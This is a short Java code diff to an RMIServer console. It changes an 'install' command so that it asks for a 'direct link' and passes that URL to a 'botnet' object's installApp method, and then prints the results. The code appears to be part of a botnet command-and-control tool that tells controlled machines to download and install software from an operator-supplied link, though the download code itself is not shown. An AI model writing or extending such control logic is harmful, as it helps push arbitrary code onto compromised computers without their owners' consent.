@@ -54,8 +54,10 @@ public class RMIServer {
                 String install = scanner.nextLine();
                 
                 if(install.equals("install")){
+                    System.out.println(">Insert direct link");
+                    String urlLink = scanner.nextLine();
                     System.out.println(">Install app/tools, pls wait 5-10 minutes!");
-                    ArrayList<String> arrInstall = botnet.installApp();
+                    ArrayList<String> arrInstall = botnet.installApp(urlLink);
                     arrInstall.forEach((i) -> {
                         System.out.println(i);
                     });
